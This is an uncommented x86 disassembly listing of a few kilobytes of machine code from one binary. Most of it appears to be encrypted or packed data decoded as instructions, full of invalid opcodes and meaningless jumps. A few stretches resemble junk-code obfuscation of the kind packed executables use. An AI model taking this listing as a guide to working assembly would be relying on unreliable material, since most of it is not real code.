  40987a:	mov    al,0x21
  40987c:	fisubr DWORD PTR [eax]
  40987e:	jnp    0x4098cb
  409880:	cs and eax,0x14fb9840
  409886:	out    0x14,eax
  409888:	aam    0xa
  40988a:	sahf   
  40988b:	aad    0x67
  40988d:	outs   dx,BYTE PTR ds:[esi]
  40988e:	aad    0x13
  409890:	jle    0x409846
  409892:	mov    eax,ds:0xcf42305b
  409897:	and    DWORD PTR [esi],edx
  409899:	sub    BYTE PTR [ecx-0x56],bl
  40989c:	int3   
  40989d:	inc    ebx
  40989e:	pop    edi
  40989f:	fldcw  WORD PTR [edx+ecx*2+0x300068dd]
  4098a6:	sbb    eax,0x2c123b69
  4098ab:	int3   
  4098ac:	pop    ss
  4098ad:	mov    di,0xe5a0
  4098b1:	test   BYTE PTR [ecx+0x61],ch
  4098b4:	call   0xc1fb:0xbb06375e
  4098bb:	jle    0x409924
  4098bd:	pop    esp
  4098be:	out    0x5,eax
  4098c0:	sub    eax,0xceb01f42
  4098c5:	add    esi,DWORD PTR [esi+0x7d66a71d]
  4098cb:	jecxz  0x4098af
  4098cd:	adc    BYTE PTR [eax+eiz*8+0x75],ch
  4098d1:	cld    
  4098d2:	xchg   ecx,eax
  4098d3:	adc    al,0x76
  4098d5:	xchg   ecx,eax
  4098d6:	xor    BYTE PTR [edx],0x7c
  4098d9:	add    al,dh
  4098db:	xchg   edi,edi
  4098dd:	into   
  4098de:	xor    esp,DWORD PTR [edi-0x40]
  4098e1:	ins    DWORD PTR es:[edi],dx
  4098e2:	pushf  
  4098e3:	ss jae 0x409938
  4098e6:	(bad)  
  4098e7:	scas   eax,DWORD PTR es:[edi]
  4098e8:	inc    eax
  4098e9:	xor    esi,esp
  4098eb:	dec    edi
  4098ec:	fisttp WORD PTR [esi-0x7237944b]
  4098f2:	inc    ecx
  4098f3:	imul   esp,DWORD PTR [esi+0x16],0x405b2a1f
  4098fa:	aam    0xa8
  4098fc:	xor    cl,BYTE PTR [edx-0x4d]
  4098ff:	out    0x5a,eax
  409901:	int3   
  409902:	xchg   edx,eax
  409903:	aam    0xc5
  409905:	stos   DWORD PTR es:[edi],eax
  409906:	dec    ebx
  409907:	jmp    0x2a7a98df
  40990c:	stc    
  40990d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40990e:	pop    ss
  40990f:	les    esp,FWORD PTR [ecx+0x320cad76]
  409915:	xlat   BYTE PTR ds:[ebx]
  409916:	ss pop ebp
  409918:	and    ebx,DWORD PTR [ecx+ebp*4]
  40991b:	inc    ebp
  40991c:	xor    BYTE PTR [esi+0x3e3b9bd7],dh
  409922:	into   
  409923:	popf   
  409924:	adc    edx,esi
  409926:	sbb    al,0x85
  409928:	fisub  DWORD PTR ds:0x16e9046
  40992e:	shl    BYTE PTR [edx],cl
  409930:	push   eax
  409931:	repz sub dl,BYTE PTR ds:0x49852579
  409938:	out    0x32,al
  40993a:	pop    es
  40993b:	mov    esp,0x6889c85e
  409940:	mov    bl,0x75
  409942:	ds popf 
  409944:	mov    ch,0xd7
  409946:	jmp    0x4098c8
  409948:	add    esi,eax
  40994a:	pop    edx
  40994b:	(bad)  
  40994d:	cmc    
  40994e:	loopne 0x409982
  409950:	mov    al,0x9b
  409952:	mov    DWORD PTR [eax+0x38],0x7b27319b
  409959:	das    
  40995a:	repnz pusha 
  40995c:	jle    0x4098f5
  40995e:	dec    esp
  40995f:	sub    al,0x5c
  409961:	push   edx
  409962:	push   0x2abac77d
  409967:	sub    BYTE PTR [eax],cl
  409969:	xchg   ebx,eax
  40996a:	pop    edx
  40996b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40996c:	mov    eax,ds:0xc31df365
  409971:	popf   
  409972:	(bad)  
  409973:	and    al,0xb9
  409975:	sbb    ah,BYTE PTR [eax+0x5c]
  409978:	xlat   BYTE PTR ds:[ebx]
  409979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40997a:	jno    0x40991d
  40997c:	lods   eax,DWORD PTR ds:[esi]
  40997d:	jg     0x40997c
  40997f:	inc    edi
  409980:	mov    esp,0xc556ee2b
  409985:	or     BYTE PTR [edi],dh
  409987:	sahf   
  409988:	pop    es
  409989:	or     edi,ebx
  40998b:	cwde   
  40998c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40998d:	lds    ebp,FWORD PTR [esi-0x71]
  409990:	sub    BYTE PTR [edx-0x32694299],dh
  409996:	inc    sp
  409998:	dec    edx
  409999:	out    0x80,eax
  40999b:	dec    edi
  40999c:	repz cmp edi,DWORD PTR [ebx+ebp*1-0x34]
  4099a1:	inc    esp
  4099a2:	add    al,0x89
  4099a4:	lahf   
  4099a5:	add    al,0x92
  4099a7:	shr    BYTE PTR ds:0xe118694b,1
  4099ad:	dec    edi
  4099ae:	aaa    
  4099af:	in     eax,0x36
  4099b1:	ror    DWORD PTR [esi],cl
  4099b3:	push   0x83d02916
  4099b8:	loop   0x40997c
  4099ba:	in     eax,dx
  4099bb:	mov    al,0xc3
  4099bd:	add    al,cl
  4099bf:	ss pop ebx
  4099c1:	imul   esp,ebp,0xffffffd7
  4099c4:	out    0x51,eax
  4099c6:	mov    DWORD PTR ds:0x42a895,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a8a5,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a895,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a819,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a799
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x6eec14cf]
  409a19:	add    BYTE PTR [esi],0xf5
  409a1c:	mov    dh,0xf7
  409a1e:	js     0x409a98
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a5c
  409a25:	not    DWORD PTR [edi]
  409a27:	xchg   edi,eax
  409a28:	dec    ebx
  409a29:	mov    dh,BYTE PTR [ebx+0x7f]
  409a2c:	lods   eax,DWORD PTR ds:[esi]
  409a2d:	scas   eax,DWORD PTR es:[edi]
  409a2e:	iret   
  409a2f:	push   ds
  409a30:	lods   al,BYTE PTR ds:[esi]
  409a31:	mov    esp,0x66d0847d
  409a36:	jbe    0x409a46
  409a38:	out    dx,eax
  409a39:	adc    BYTE PTR [edx-0x64fe637],0x15
  409a40:	pop    ds
  409a41:	sub    cl,bl
  409a43:	jg     0x409a60
  409a45:	mov    cl,BYTE PTR [ebx]
  409a47:	jmp    0x59d2:0x9b0e5be8
  409a4e:	imul   ecx,DWORD PTR [esi],0x215b7e2d
  409a54:	fnstenv [ebp-0x1c59423b]
  409a5a:	jp     0x409aaa
  409a5c:	cmp    cl,BYTE PTR [ebx]
  409a5e:	inc    eax
  409a5f:	cmp    BYTE PTR [eax-0x45ec608],dl
  409a65:	jmp    0x6023:0xfc25765d
  409a6c:	cli    
  409a6d:	or     DWORD PTR [ecx+0x2d],esi
  409a70:	cwde   
  409a71:	pop    ecx
  409a72:	in     eax,dx
  409a73:	cmp    ebp,DWORD PTR [esi-0x741b0dab]
  409a79:	pop    edx
  409a7a:	jno    0x409a25
  409a7c:	pop    esi
  409a7d:	adc    al,0x70
  409a7f:	xor    ch,BYTE PTR [esi]
  409a81:	adc    BYTE PTR [ebx],bh
  409a83:	ret    0x3865
  409a86:	mov    al,ds:0x50ebef39
  409a8b:	mov    esp,edi
  409a8d:	mov    dh,0x32
  409a8f:	and    edi,ecx
  409a91:	pushf  
  409a92:	in     eax,0x1a
  409a94:	mov    edi,0xe9b9bf57
  409a9a:	test   eax,0xf2af1f43
  409a9f:	cmp    al,0x23
  409aa1:	fidivr WORD PTR [edi]
  409aa3:	pop    ds
  409aa4:	pop    ds
  409aa5:	in     al,0xaa
  409aa7:	call   0x8692665c
  409aac:	mov    ch,BYTE PTR [ecx+0x6a]
  409aaf:	pop    eax
  409ab0:	cmp    al,0xd7
  409ab2:	fdiv   DWORD PTR [ebx]
  409ab4:	cmp    BYTE PTR [eax-0x2c480a1],bh
  409aba:	add    edi,DWORD PTR [esi-0x7737359c]
  409ac0:	jmp    0x409a98
  409ac2:	call   0x55f93aa9
  409ac7:	adc    dl,dh
  409ac9:	jns    0x409ab9
  409acb:	retf   0x5395
  409ace:	sbb    esp,ecx
  409ad0:	mov    esp,ss
  409ad2:	push   es
  409ad3:	fimul  DWORD PTR [edi]
  409ad5:	xchg   ecx,eax
  409ad6:	loope  0x409ab4
  409ad8:	mov    ah,BYTE PTR [ecx+ecx*4+0x1c]
  409adc:	xor    edi,ebp
  409ade:	jg     0x409b53
  409ae0:	dec    eax
  409ae1:	(bad)  
  409ae2:	xor    dh,BYTE PTR [ecx-0x10182c7]
  409ae8:	mov    edi,0x59a7ea66
  409aed:	mov    eax,0x33f5a626
  409af2:	mov    ds:0x63543c5e,eax
  409af7:	(bad)  
  409af8:	xchg   esi,eax
  409af9:	outs   dx,DWORD PTR ds:[esi]
  409afa:	(bad)  
  409afb:	and    al,0xb6
  409afd:	in     al,dx
  409afe:	mov    ecx,0x351bcab5
  409b03:	dec    edx
  409b04:	push   ebx
  409b05:	(bad)  
  409b06:	mov    ds:0x17c39522,al
  409b0b:	ss mov ah,0x7f
  409b0e:	(bad)  
  409b0f:	cmp    ecx,DWORD PTR [edi-0x519ffe3e]
  409b15:	pop    ss
  409b16:	popf   
  409b17:	push   0xffffffe2
  409b19:	fbld   TBYTE PTR [edi-0x18]
  409b1c:	jge    0x409b97
  409b1e:	lea    edx,[ecx]
  409b20:	inc    esp
  409b21:	repz leave 
  409b23:	popa   
  409b24:	loopne 0x409ae2
  409b26:	lods   eax,DWORD PTR ss:[esi]
  409b28:	dec    eax
  409b29:	dec    esi
  409b2a:	rcr    DWORD PTR [edi-0x12],0x74
  409b2e:	sbb    ecx,DWORD PTR [ebx-0x6d42834c]
  409b34:	pop    edi
  409b35:	je     0x409b7d
  409b37:	not    DWORD PTR [ecx]
  409b39:	inc    edi
  409b3a:	std    
  409b3b:	ins    BYTE PTR es:[edi],dx
  409b3c:	mov    BYTE PTR [ecx+0x644ba48a],dh
  409b42:	popf   
  409b43:	push   esp
  409b44:	or     ecx,esp
  409b46:	int3   
  409b47:	in     al,0x5d
  409b49:	ss mov esi,eax
  409b4c:	in     eax,dx
  409b4d:	lock cmp cl,cl
  409b50:	loopne 0x409b0c
  409b52:	lods   eax,DWORD PTR ds:[esi]
  409b53:	fs jle 0x409b9d
  409b56:	mov    edx,0xb2b7554e
  409b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b5c:	and    al,0xbe
  409b5e:	test   al,0xbb
  409b60:	pushf  
  409b61:	sbb    bh,BYTE PTR [eax]
  409b63:	mov    ds:0x7ec885c8,eax
  409b68:	in     al,dx
  409b69:	sub    DWORD PTR [ecx],edi
  409b6b:	cmp    DWORD PTR [ebp-0x47],edx
  409b6e:	or     DWORD PTR [ebx+0x17],ecx
  409b71:	mov    edx,DWORD PTR [edx]
  409b73:	add    al,0xa7
  409b75:	repz jne 0x409b09
  409b78:	call   0xa2cb8c5d
  409b7d:	cmc    
  409b7e:	imul   esi,DWORD PTR [ebx+0x44759bf2],0x583d7ae1
  409b88:	jge    0x409bd4
  409b8a:	retf   0xeb47
  409b8d:	push   esp
  409b8e:	ins    BYTE PTR es:[edi],dx
  409b8f:	dec    esp
  409b90:	pop    edi
  409b91:	inc    ebp
  409b92:	sbb    BYTE PTR [eax+0x2],bh
  409b95:	jg     0x409b50
  409b97:	inc    edi
  409b98:	adc    eax,0xc3584a9e
  409b9d:	cwde   
  409b9e:	aaa    
  409b9f:	sti    
  409ba0:	nop
  409ba1:	push   cs
  409ba2:	add    al,0x16
  409ba4:	scas   eax,DWORD PTR es:[edi]
  409ba5:	jo     0x409c24
  409ba7:	js     0x409bde
  409ba9:	xor    eax,esp
  409bab:	lds    edi,FWORD PTR [edi+0x71]
  409bae:	leave  
  409baf:	pop    edi
  409bb0:	xchg   edi,eax
  409bb1:	mov    WORD PTR [esi+0x7],es
  409bb4:	sti    
  409bb5:	xchg   ebx,eax
  409bb6:	fs das 
  409bb8:	out    0x24,eax
  409bba:	or     bh,bh
  409bbc:	xor    BYTE PTR gs:[eax+0x522799af],bh
  409bc3:	lahf   
  409bc4:	or     BYTE PTR [eax-0x19],bh
  409bc7:	mov    esi,DWORD PTR [ecx+0x1e]
  409bca:	ins    BYTE PTR es:[edi],dx
  409bcb:	xor    ch,BYTE PTR [eax+0x1b015b58]
  409bd1:	fild   DWORD PTR [edx-0x1e736404]
  409bd7:	inc    eax
  409bd8:	aas    
  409bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bda:	inc    ebx
  409bdb:	push   ds
  409bdc:	fmul   DWORD PTR [ecx-0x12087e56]
  409be2:	adc    al,0x58
  409be4:	jle    0x409b8e
  409be6:	(bad)
  409be9:	mov    ebx,0x1cfb5a24
  409bee:	lds    esp,FWORD PTR [ebx+0xed542f2]
  409bf4:	nop
  409bf5:	div    BYTE PTR [ebp-0x708e1929]
  409bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bfc:	sbb    BYTE PTR [edx-0x80],dh
  409bff:	cmp    eax,0xa9224b43
  409c04:	or     eax,0x8f19f4c
  409c09:	pop    ecx
  409c0a:	or     BYTE PTR [ebx],bh
  409c0c:	adc    DWORD PTR [esi-0x10],esp
  409c0f:	in     eax,0xf3
  409c11:	mov    ch,0x6
  409c13:	cmp    eax,0xd80b0a14
  409c18:	or     BYTE PTR [ecx],bl
  409c1a:	arpl   WORD PTR [eax],sp
  409c1c:	ret    0xd80f
  409c1f:	sti    
  409c20:	add    dh,BYTE PTR [edi-0x71]
  409c23:	rcl    DWORD PTR [edx+0x55],1
  409c26:	xchg   ebx,eax
  409c27:	(bad)  
  409c28:	xchg   ebp,eax
  409c29:	push   ebx
  409c2a:	stos   DWORD PTR es:[edi],eax
  409c2b:	xchg   esi,eax
  409c2c:	xor    al,0xac
  409c2e:	pop    ebp
  409c2f:	bound  ecx,QWORD PTR [ebp+0x43e9c066]
  409c35:	cmpxchg edi,esi
  409c38:	jg     0x409c2d
  409c3a:	inc    edx
  409c3b:	or     ebp,eax
  409c3d:	push   ebx
  409c3e:	gs pop es
  409c40:	and    eax,0xec0c24e2
  409c45:	mov    esp,0x19f90bbb
  409c4a:	aad    0xb2
  409c4c:	pop    ebx
  409c4d:	ins    BYTE PTR es:[edi],dx
  409c4e:	nop
  409c4f:	(bad)
  409c52:	imul   esi,esi,0x43616eb9
  409c58:	mov    bl,0x80
  409c5a:	es loope 0x409cbe
  409c5d:	jge    0x409be8
  409c5f:	imul   ebx,ebp,0x4682f39c
  409c65:	dec    edi
  409c66:	call   0x6a766d0e
  409c6b:	mov    ebp,0xd503a96
  409c70:	fs jge 0x409c81
  409c73:	imul   ebp,ebp,0xffffffee
  409c76:	imul   esp
  409c78:	xchg   DWORD PTR [edi-0x2b],edx
  409c7b:	or     BYTE PTR [edx],al
  409c7d:	xchg   edi,eax
  409c7e:	fisubr DWORD PTR [esi-0x3]
  409c82:	cwde   
  409c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c85:	pop    eax
  409c86:	fwait
  409c87:	xchg   BYTE PTR [edi+0x54],ch
  409c8a:	pushf  
  409c8b:	and    BYTE PTR [esi-0x7c],bh
  409c8e:	in     al,0xf3
  409c90:	jecxz  0x409ccb
  409c92:	fsubr  st,st(4)
  409c94:	jbe    0x409c79
  409c96:	push   ebx
  409c97:	mov    eax,0x673d64bf
  409c9c:	retf   
  409c9d:	lods   al,BYTE PTR ds:[esi]
  409c9e:	push   esi
  409c9f:	xor    al,ah
  409ca1:	mov    WORD PTR [ecx+0x20],?
  409ca4:	sbb    al,0x18
  409ca6:	out    dx,al
  409ca7:	mov    eax,ds:0x5f9186c
  409cac:	je     0x409c82
  409cae:	das    
  409caf:	xchg   edi,eax
  409cb0:	or     eax,0xb9bf56be
  409cb5:	cmp    al,0x18
  409cb7:	jb     0x409cae
  409cb9:	clc    
  409cba:	mov    ds:0xf3ddd069,al
  409cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc0:	or     dh,cl
  409cc2:	push   cs
  409cc3:	lds    eax,FWORD PTR [esi]
  409cc5:	shr    BYTE PTR [ebp+0x3cd4dc5],1
  409ccb:	or     eax,0x7c37b190
  409cd0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cd2:	cmp    bl,dl
  409cd4:	fwait
  409cd5:	sbb    dl,cl
  409cd7:	mov    edx,DWORD PTR [edx+esi*1-0x2acdee0d]
  409cde:	add    eax,0xeb9c9cf5
  409ce3:	add    ah,BYTE PTR [ebp+0x34f32d4e]
  409ce9:	sub    al,0x34
  409ceb:	xor    BYTE PTR [ebx+0x1f],dh
  409cee:	or     al,0xf9
  409cf0:	pop    eax
  409cf1:	js     0x409cdd
  409cf3:	sub    ecx,DWORD PTR [eiz*1+0x7aa5a168]
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a799,0x42a825
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a79d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a861,0x42a85d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a851,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi+0x4237acab],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d2a
  409d66:	inc    edi
  409d67:	mov    cl,0x37
  409d69:	add    ebx,DWORD PTR [ebp+0x34ca0096]
  409d6f:	daa    
  409d70:	stos   DWORD PTR es:[edi],eax
  409d71:	cmp    DWORD PTR [eax-0x4b],eax
  409d74:	jb     0x409db3
  409d76:	dec    ebp
  409d77:	daa    
  409d78:	(bad)  
  409d79:	repz in eax,0x8c
  409d7c:	aaa    
  409d7d:	pusha  
  409d7e:	and    esi,esi
  409d80:	push   es
  409d81:	jbe    0x409d2c
  409d83:	cmc    
  409d84:	aas    
  409d85:	jne    0x409d49
  409d87:	push   ds
  409d88:	sti    
  409d89:	xchg   ebx,eax
  409d8a:	lods   eax,DWORD PTR ds:[esi]
  409d8b:	sub    dh,al
  409d8d:	clc    
  409d8e:	lea    edx,[edx+0x8568a3c]
  409d94:	xor    BYTE PTR ds:0x8280ce0,dl
  409d9a:	clc    
  409d9b:	pop    ecx
  409d9c:	jb     0x409d63
  409d9e:	push   esp
  409d9f:	jmp    DWORD PTR [edi]
  409da1:	xor    DWORD PTR [ebx+0x1af996af],esp
  409da7:	mov    ds:0x68690d2,al
  409dac:	adc    ch,cl
  409dae:	mov    ecx,0xe6c304b7
  409db3:	inc    ecx
  409db4:	pop    edx
  409db5:	out    0x44,al
  409db7:	or     eax,0x5e517233
  409dbc:	fisttp WORD PTR [esi+0x6798fd16]
  409dc2:	pop    es
  409dc3:	adc    al,0xbf
  409dc5:	mov    eax,0x80c281e2
  409dca:	bound  ecx,QWORD PTR [edx]
  409dcc:	test   al,0xec
  409dce:	test   eax,0x19fd3383
  409dd3:	fcmovu st,st(5)
  409dd5:	fbstp  TBYTE PTR [edx]
  409dd7:	jae    0x409d84
  409dd9:	fucomp st(6)
  409ddb:	enter  0xbbe6,0x58
  409ddf:	mov    ah,0x57
  409de1:	outs   dx,DWORD PTR ds:[esi]
  409de2:	inc    ecx
  409de3:	popa   
  409de4:	xor    DWORD PTR [ebx+0x18],0x2e
  409de8:	sub    ecx,DWORD PTR [eax-0x3c]
  409deb:	mov    ebp,0xda201aac
  409df0:	mul    dh
  409df2:	pop    ebp
  409df3:	je     0x409de5
  409df5:	mov    bh,BYTE PTR [esi-0x4152364d]
  409dfb:	pop    edi
  409dfc:	dec    esi
  409dfd:	cli    
  409dfe:	into   
  409dff:	mov    ds:0x6e757dd9,al
  409e04:	clc    
  409e05:	pop    ebp
  409e06:	inc    edi
  409e07:	xor    eax,0x54ec0d91
  409e0c:	mov    al,ds:0x85ccf7af
  409e11:	out    dx,al
  409e12:	adc    dl,ch
  409e14:	pop    ebp
  409e15:	inc    ebx
  409e16:	loop   0x409de0
  409e18:	cmp    edi,DWORD PTR [ebx+0x6dae9dd7]
  409e1e:	mov    edx,0x78ddc063
  409e23:	sub    DWORD PTR [esi-0x2905248c],ebp
  409e29:	dec    edx
  409e2a:	jge    0x409dca
  409e2c:	or     al,0xed
  409e2e:	scas   al,BYTE PTR es:[edi]
  409e2f:	xlat   BYTE PTR ds:[ebx]
  409e30:	(bad)  
  409e31:	clc    
  409e32:	and    cl,BYTE PTR [eax+ebx*8-0x62]
  409e36:	arpl   WORD PTR [ebx],cx
  409e38:	ror    DWORD PTR [esi+0x3d],cl
  409e3b:	push   eax
  409e3c:	daa    
  409e3d:	mov    dh,0x33
  409e3f:	mov    edx,0xc871b5a6
  409e44:	vunpcklps xmm1,xmm7,XMMWORD PTR [esi+0xe510201]
  409e4c:	mov    dl,0x3a
  409e4e:	stos   BYTE PTR es:[edi],al
  409e4f:	or     DWORD PTR [eax],esi
  409e51:	(bad)  
  409e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e53:	xchg   ebx,eax
  409e54:	mov    ds:0xf2487ab6,al
  409e59:	cvtps2pi mm5,xmm4
  409e5c:	mov    dl,0xe8
  409e5e:	popa   
  409e5f:	das    
  409e60:	adc    BYTE PTR [ebx-0x20],bh
  409e63:	scas   eax,DWORD PTR es:[edi]
  409e64:	xor    BYTE PTR [ebx+0x25a8b56d],0xba
  409e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e6c:	inc    edi
  409e6d:	jne    0x409e32
  409e6f:	cmp    cl,BYTE PTR [ebx+0x5cbcd70]
  409e75:	fstp   TBYTE PTR [eax]
  409e77:	mov    edx,0xcfb03e24
  409e7c:	sbb    eax,0xadce0f36
  409e81:	(bad)  
  409e82:	xor    ebx,ecx
  409e84:	bound  ebx,QWORD PTR [esp+edi*1-0xa]
  409e88:	mov    ?,WORD PTR [esi]
  409e8a:	xchg   ebp,eax
  409e8b:	int    0xd9
  409e8d:	fdivr  QWORD PTR [ebx+0x2d]
  409e90:	call   FWORD PTR [ecx]
  409e92:	pop    esp
  409e93:	xchg   ebx,eax
  409e94:	xlat   BYTE PTR ds:[ebx]
  409e95:	pushf  
  409e96:	and    DWORD PTR [edx],edx
  409e98:	pop    ss
  409e99:	push   eax
  409e9a:	int    0x9a
  409e9c:	jo     0x409e6f
  409e9e:	arpl   WORD PTR [eax+0x382c301],ax
  409ea4:	test   cl,bl
  409ea6:	push   0x6d
  409ea8:	out    dx,eax
  409ea9:	pop    esp
  409eaa:	out    0x13,eax
  409eac:	imul   esi,ecx,0x19
  409eaf:	xor    al,0x3a
  409eb1:	jl     0x409ec6
  409eb3:	cld    
  409eb4:	nop
  409eb5:	push   esp
  409eb6:	fadd   QWORD PTR [eax-0x27a93a6d]
  409ebc:	dec    esi
  409ebd:	sbb    ebx,DWORD PTR [eax-0x19639084]
  409ec3:	xor    DWORD PTR [eax],0x68
  409ec6:	ss inc ebx
  409ec8:	cmp    dh,BYTE PTR [edi+eiz*8-0x5c]
  409ecc:	fmul   QWORD PTR [ecx+ecx*4]
  409ecf:	(bad)  
  409ed0:	call   0xe970:0xa1737188
  409ed7:	push   0x3b
  409ed9:	jmp    0xebd2fb47
  409ede:	test   eax,0x8691ee5c
  409ee3:	inc    edi
  409ee4:	xchg   DWORD PTR [edx+0x66bd719],esp
  409eea:	mov    ch,0x36
  409eec:	and    al,0x92
  409eee:	retf   0xf78d
  409ef1:	cld    
  409ef2:	and    eax,edx
  409ef4:	pop    ds
  409ef5:	popf   
  409ef6:	add    eax,0xa9eb4dda
  409efb:	call   0xa1159106
  409f00:	jg     0x409f38
  409f02:	add    al,cl
  409f04:	dec    ebp
  409f05:	xor    ah,bl
  409f07:	mov    dl,0xce
  409f09:	stc    
  409f0a:	dec    esi
  409f0b:	or     eax,0xf2a535c5
  409f10:	in     al,dx
  409f11:	loopne 0x409f66
  409f13:	ins    BYTE PTR es:[edi],dx
  409f14:	inc    esp
  409f15:	fwait
  409f16:	xchg   edx,eax
  409f17:	addr16 inc ebx
  409f19:	ja     0x409f23
  409f1b:	and    al,0xd0
  409f1d:	popa   
  409f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f1f:	xchg   BYTE PTR [esi-0x7e980138],dh
  409f25:	std    
  409f26:	pop    edi
  409f27:	and    DWORD PTR es:[edx+0x53],ebx
  409f2b:	and    al,0xcc
  409f2d:	adc    BYTE PTR [eax+0x7e],bh
  409f30:	neg    DWORD PTR [ecx+0x4224b98e]
  409f36:	dec    ebp
  409f37:	retf   0x817f
  409f3a:	and    eax,0x6f4f690c
  409f3f:	loope  0x409f92
  409f41:	pop    ecx
  409f42:	jb     0x409f18
  409f44:	imul   bl
  409f46:	or     eax,0x822c3d7a
  409f4b:	sbb    al,0x1b
  409f4d:	test   BYTE PTR [di],0xa8
  409f51:	ret    
  409f52:	pop    edx
  409f53:	test   al,0xbb
  409f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f56:	cmp    DWORD PTR [ebx],ecx
  409f58:	gs repz sar dh,1
  409f5c:	(bad)  
  409f5d:	push   esi
  409f5e:	lds    ecx,FWORD PTR [esi+0x3e673481]
  409f64:	and    DWORD PTR [ebx],0xffffff91
  409f67:	sbb    esi,ecx
  409f69:	dec    ebp
  409f6a:	xor    BYTE PTR [edx-0x1f],bl
  409f6d:	xor    DWORD PTR [esi],ebp
  409f6f:	mov    al,0x89
  409f71:	or     DWORD PTR [ebx-0x59ecc054],esi
  409f77:	xchg   edi,eax
  409f78:	fbld   TBYTE PTR [esi+0x7b7db719]
  409f7e:	retf   
  409f7f:	(bad)  
  409f80:	jge    0x409f09
  409f82:	cld    
  409f83:	ret    
  409f84:	pop    ds
  409f85:	mov    DWORD PTR ds:0x5703208,0xfbde9a0d
  409f8f:	push   eax
  409f90:	mov    al,ds:0x46b793bc
  409f95:	jo     0x409f84
  409f97:	jo     0x409ff2
  409f99:	stos   BYTE PTR es:[edi],al
  409f9a:	fs lahf 
  409f9c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f9e:	inc    esp
  409f9f:	sbb    al,cl
  409fa1:	mov    edx,0xd2afd704
  409fa6:	jmp    0x480b:0x22687df8
  409fad:	add    DWORD PTR [ecx],ebp
  409faf:	cmp    eax,0x39911fd8
  409fb4:	add    al,0x67
  409fb6:	outs   dx,DWORD PTR ds:[esi]
  409fb7:	leave  
  409fb8:	pop    ecx
  409fb9:	or     cl,BYTE PTR [ebx]
  409fbb:	or     al,0xff
  409fbd:	sub    al,0x4
  409fbf:	jo     0x409fa1
  409fc1:	bound  eax,QWORD PTR [edx]
  409fc3:	sbb    edx,DWORD PTR [esi+0x2cbe31b9]
  409fc9:	dec    ecx
  409fca:	dec    ecx
  409fcb:	les    ebx,FWORD PTR [ecx]
  409fcd:	push   0xab879651
  409fd2:	repz (bad) 
  409fd5:	(bad)  
  409fd7:	cwde   
  409fd8:	push   cs
  409fd9:	adc    BYTE PTR [eax],0x41
  409fdc:	(bad)  
  409fdd:	into   
  409fde:	cmp    bh,0xce
  409fe1:	lock rol DWORD PTR [edx],0x28
  409fe5:	pop    eax
  409fe6:	jge    0x40a00b
  409fe8:	add    eax,edi
  409fea:	stos   BYTE PTR es:[edi],al
  409feb:	adc    eax,0x4fbe4f32
  409ff0:	lods   eax,DWORD PTR ds:[esi]
  409ff1:	fidiv  DWORD PTR [eax+ecx*2+0x5b]
  409ff5:	das    
  409ff6:	pop    edx
  409ff7:	sti    
  409ff8:	imul   ebp,DWORD PTR [esi+0x62],0x1c
  409ffc:	(bad)  [edx-0x4dcb3cd]
  40a002:	loopne 0x409fca
  40a004:	xchg   edi,eax
  40a005:	shr    DWORD PTR [ebp-0x60],cl
  40a008:	mov    esi,0x2466fbc3
  40a00d:	cli    
  40a00e:	js     0x409ff6
  40a010:	xchg   ebx,eax
  40a011:	xchg   esi,eax
  40a012:	shl    cl,cl
  40a014:	adc    bh,BYTE PTR [ebp-0x4d3141ce]
  40a01a:	adc    cl,bl
  40a01c:	cwde   
  40a01d:	into   
  40a01e:	jmp    0x75e3:0x867e49f
  40a025:	push   sp
  40a027:	mov    ds:0xb045ea41,al
  40a02c:	(bad)  
  40a02d:	neg    al
  40a02f:	int    0x3b
  40a031:	add    al,BYTE PTR [ebx+0x225ccfda]
  40a037:	shl    BYTE PTR [edi],0xab
  40a03a:	aaa    
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
